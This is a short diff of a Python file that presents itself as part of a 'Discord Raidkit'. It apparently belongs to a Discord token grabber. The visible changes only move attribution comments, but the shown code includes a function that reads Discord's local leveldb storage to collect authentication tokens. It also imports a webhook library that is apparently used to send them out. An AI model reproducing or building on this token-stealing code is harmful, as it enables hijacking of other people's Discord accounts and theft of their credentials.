@@ -1,8 +1,9 @@
+# By ytsix (https://github.com/ytsix); part of the Discord Raidkit (https://github.com/Catterall/discord-raidkit).
+
 import requests, os, re, sys, shutil, string, winreg
 
 from dhooks import Webhook, Embed
 
-#by @ytsix
 
 def GhostExt(path):
     path += '\\Local Storage\\leveldb'
@@ -19,7 +20,6 @@ def GhostExt(path):
         return tokens
     except:
         pass
-#by @ytsix
 
 def GhostInf():
     
